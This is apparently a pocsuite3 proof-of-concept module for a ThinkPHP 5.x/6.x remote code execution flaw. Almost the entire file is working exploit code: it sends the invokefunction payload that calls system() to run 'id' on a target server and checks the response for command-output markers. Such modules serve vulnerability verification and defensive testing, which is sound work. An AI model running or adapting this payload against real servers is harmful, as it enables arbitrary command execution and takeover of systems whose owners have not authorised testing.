from pocsuite3.api import Output, POCBase, register_poc, requests, logger

class ThinkPHP_RCE(POCBase):
    vulID = '99617'
    version = '1.0'
    author = 'Security Researcher'
    vulDate = '2023-10-27'
    createDate = '2023-10-27'
    updateDate = '2023-10-27'
    references = ['SSVID-99617']
    name = 'ThinkPHP 远程代码执行漏洞'
    appPowerLink = 'https://www.thinkphp.cn/'
    appName = 'ThinkPHP'
    appVersion = ['5.0.0', '5.0.23', '5.1.x', '6.0.x']
    vulType = 'RCE'
    desc = 'ThinkPHP 5.0.x/5.1.x/6.0.x 版本存在远程代码执行漏洞，攻击者可以通过构造特殊的请求参数执行任意系统命令。'
    samples = []
    install_requires = []

    def _verify(self):
        result = {}
        path = self.get_option('path')
        
        # Standard ThinkPHP 5.x RCE payload using invokefunction
        # This payload attempts to execute 'id' command via system()
        payload = "\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
        url = path + "/index.php?s=" + payload

        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; Pocsuite3/1.0)',
            'Referer': path
        }

        try:
            r = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
            
            # Check if the response contains common indicators of command execution
            # We check for 'uid=', 'gid=', 'groups=', 'docker', 'root', or 'www-data'
            if any(keyword in r.text for keyword in ['uid=', 'gid=', 'groups=', 'docker', 'root', 'www-data', 'pocsuite3']):
                result['VerifyInfo'] = {
                    'URL': url,
                    'Payload': payload,
                    'Status': 'Vulnerable'
                }
                logger.info(f"Vulnerability verified at {url}")
        except Exception as e:
            logger.error(f"Request failed: {str(e)}")

        return self.parse_output(result)

    def _attack(self):
        # Attack method usually mirrors verify for RCE unless a specific destructive payload is required
        return self._verify()

    def parse_output(self, result):
        out = Output(self)
        if result:
            out.success(result)
        else:
            out.fail('target is not vulnerable')
        return out

register_poc(ThinkPHP_RCE)